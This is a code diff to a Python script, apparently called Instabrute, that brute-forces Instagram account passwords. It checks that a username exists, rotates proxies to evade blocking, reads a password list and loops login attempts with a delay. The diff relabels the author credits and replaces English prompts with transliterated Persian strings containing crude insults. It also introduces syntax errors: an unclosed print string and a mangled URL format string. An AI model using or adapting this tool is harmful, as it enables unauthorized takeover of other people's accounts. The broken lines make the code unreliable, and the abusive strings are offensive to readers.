@@ -10,11 +10,16 @@ import random
 import sys
 
 #presentation & Thanks
-print("Creator MOJTABA C4SSIF3R")
+print("MoJtaBa CaSsiFeR")
 print("")
 print("If you need: ")
-print("Telegram: @Creator_Typeri")
+print("Telegram: @Creator_Typeri ")
+print(" ╦╔═╗  ╦ ╦╔═╗╔═╗╦╔═")
+print(" ║║ ╦──╠═╣╠═╣║  ╠╩╗ ")
+print(" ╩╚═╝  ╩ ╩╩ ╩╚═╝╩ ╩ ")
+print( Kos Nanat Age Eski Beri")
 print("")
+
 
 #Help function
 def Input(text):
@@ -39,7 +44,7 @@ class Instabrute():
                 self.IsUserExists()
 
 
-                UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
+                UsePorxy = Input('[*] Dos Dari Az Proxy Estefade Koni-? (y/n): ').upper()
                 if (UsePorxy == 'Y' or UsePorxy == 'YES'):
                         self.randomProxy()
 
@@ -57,8 +62,8 @@ class Instabrute():
                                         Input('[*] Press enter to exit')
                                         exit()
                 else:
-                        print ('Please create passwords file named "%s"' % self.passwordsFile)
-                        Input('[*] Press enter to exit')
+                        print ('Ye Password List Besaz KoskhoL "%s"' % self.passwordsFile)
+                        Input('[*] ENTER bezan Beri Gom Shi')
                         exit()
 
         #Choose random proxy from proxys file
@@ -80,7 +85,7 @@ class Instabrute():
 
         #Check if username exists in instagram server
         def IsUserExists(self):
-                r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username)
+                r = requests.get('https://www.instagram.com/%s/?__a=1%27 self.username)
                 if (r.status_code == 404):
                         print ('[*] User named "%s" not found' % username)
                         Input('[*] Press enter to exit')
@@ -105,7 +110,7 @@ class Instabrute():
                         'ContentType' : 'application/x-www-form-urlencoded',
                         'Connection': 'keep-alive',
                         'Accept': '*/*',
-                        'Referer': 'https://www.instagram.com',
+                        'Referer': 'https://instagram.com',
                         'authority': 'instagram.com',
                         'Host' : 'instagram.com',
                         'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
@@ -120,7 +125,7 @@ class Instabrute():
 
 
 
-instabrute = Instabrute(Input('Please enter a username: '))
+instabrute = Instabrute(Input('Yek Uzer Vared Kon Yatim: '))
 
 try:
         delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): '))
